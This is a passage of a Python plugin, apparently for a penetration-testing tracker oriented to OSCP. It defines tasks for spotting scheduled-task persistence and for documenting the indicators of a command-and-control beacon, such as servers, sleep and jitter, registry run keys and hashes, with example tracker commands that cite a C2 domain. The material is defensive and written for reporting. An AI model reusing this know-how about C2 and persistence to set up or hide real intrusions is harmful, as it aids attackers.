                                    'Manual: Open Task Scheduler and filter by author/location'
                                ],
                                'notes': 'Scheduled tasks are MITRE ATT&CK T1053.005 (Windows) / T1053.003 (Linux cron)',
                                'estimated_time': '5-10 minutes'
                            }
                        }
                    ]
                },
                # Documentation and Reporting
                {
                    'id': 'c2-documentation',
                    'name': 'C2 Indicators Documentation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Document all C2 indicators for OSCP report',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'POST_EXPLOIT'],
                        'notes': [
                            'OSCP Report Requirements:',
                            '',
                            '1. C2 Infrastructure:',
                            '   - C2 server IP/domain',
                            '   - Ports and protocols (HTTP/HTTPS/SMB/TCP)',
                            '   - User-Agent strings',
                            '   - Custom HTTP headers and parameters',
                            '',
                            '2. Beacon Configuration:',
                            '   - Sleep/jitter values (indicates callback frequency)',
                            '   - Kill date (if configured)',
                            '   - Working hours (OpSec feature)',
                            '   - Download chunk size',
                            '',
                            '3. Persistence Mechanisms:',
                            '   - Registry Run keys with full paths',
                            '   - Startup folder .lnk files',
                            '   - Scheduled tasks with trigger details',
                            '   - DLL hijacking locations',
                            '',
                            '4. IOCs (Indicators of Compromise):',
                            '   - File hashes (MD5/SHA256)',
                            '   - File paths and timestamps',
                            '   - Process names and PIDs',
                            '   - Network connections (IP:port pairs)',
                            '',
                            '5. Screenshots:',
                            '   - Extracted configuration (JSON/text)',
                            '   - Network traffic in Wireshark',
                            '   - Process list showing beacon',
                            '   - Persistence registry keys',
                            '',
                            'Use CRACK Track to document:',
                            'crack track finding <target> --type c2_infrastructure --description "AdaptixC2 beacon found" --source "Memory dump analysis"',
                            'crack track note <target> "C2 config: servers=[tech-system.online:443], sleep=4s"',
                            ''
                        ],
                        'estimated_time': '15-30 minutes'
                    }
                }
            ]
        }

    def on_task_complete(self, task_id: str, result: str, target: str) -> List[Dict[str, Any]]:
        return []

    def get_manual_alternatives(self, task_id: str) -> List[str]:
        return ['Manual enumeration based on obtained shell type']
